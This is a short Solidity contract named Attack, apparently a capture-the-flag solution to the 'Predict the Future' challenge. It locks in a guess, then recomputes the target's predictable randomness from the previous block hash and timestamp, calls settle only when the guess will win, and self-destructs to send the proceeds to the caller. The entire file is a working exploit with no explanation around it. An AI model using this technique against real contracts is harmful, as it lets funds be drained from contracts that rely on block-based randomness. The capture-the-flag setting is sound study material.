// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./PredictTheFuture.sol";

contract Attack {
    PredictTheFutureChallenge private target;

    constructor(address _address) public {
        target = PredictTheFutureChallenge(_address);
    }

    function lockInGuess() external payable {
        require(msg.value == 1 ether);

        target.lockInGuess.value(1 ether)(5);
    }

    function hack() external payable {
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        require(answer == 5);
        target.settle();

        selfdestruct(msg.sender);
    }

    function() public payable {}
}
